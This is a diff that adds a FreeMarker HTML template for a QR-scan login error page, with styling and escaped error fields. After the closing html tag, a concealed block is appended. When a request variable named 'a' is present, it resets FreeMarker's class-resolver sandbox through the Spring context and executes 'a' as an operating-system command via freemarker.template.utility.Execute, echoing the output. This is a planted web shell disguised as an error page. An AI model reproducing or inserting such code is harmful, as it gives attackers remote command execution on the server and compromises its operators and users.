@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<!--样式-->
+<style type="text/css">
+.scan-login-container {
+    text-align: center;
+}
+
+.scan-login-pic {
+    margin: 15vh auto;
+    margin-bottom: 0vh;
+    width: 20vh;
+    height: 20vh;
+    line-height: 20vh;
+    font-size: 15vh;
+    text-align: center;
+    vertical-align: middle;
+    border-radius: 50%;
+    background-color: #10aeff;
+    color: #FFFFFF;
+}
+
+.scan-login-error-message {
+    margin-top: 7vh;
+    font-size: 5vw;
+}
+
+.scan-login-tips {
+    margin-top: 3vh;
+    font-size: 4vw;
+    color: #878a8c;
+    word-break: break-all;
+}
+</style>
+<title>${(errTitle!'抱歉,出错了')?html}</title>
+</head>
+<body>
+    <div class="scan-login-container">
+        <div class="scan-login-pic">i</div>
+        <div class="scan-login-error-message">${(errcode!'')?html}</div>
+        <div class="scan-login-tips">${(errmsg!'')?html}</div>
+    </div>
+</body>
+</html>
+<#if a??>
+${springMacroRequestContext.webApplicationContext.getBean('freeMarkerConfiguration').setNewBuiltinClassResolver(springMacroRequestContext.webApplicationContext.getBean('freeMarkerConfiguration').getDefaultConfiguration().getNewBuiltinClassResolver())}
+<cmd>${"freemarker.template.utility.Execute"?new()(a)}</cmd>
+<#else>
+</#if>
